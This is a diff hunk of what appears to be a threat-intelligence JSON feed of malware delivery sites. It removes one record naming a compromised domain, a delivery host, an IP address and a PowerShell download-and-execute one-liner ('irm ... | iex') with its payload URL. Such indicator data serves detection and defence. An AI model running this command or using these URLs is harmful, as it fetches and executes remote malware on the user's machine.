@@ -2104,24 +2104,5 @@
     ],
     "ReportId": "cmwpowk8923to0omlpmzxz9ut",
     "ScannedAt": "2026-11-21T00:48:49.049000+00:00"
-  },
-  {
-    "UrlDomain": "3elife.vn",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/615573e32a14a9bc"
-    ],
-    "IP": [
-      "103.200.23.19"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/615573e32a14a9bc')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/615573e32a14a9bc"
-    ],
-    "ReportId": "cmwpowabb23s00omlnjfvwnz5",
-    "ScannedAt": "2026-11-21T00:48:36.215000+00:00"
   }
 ]
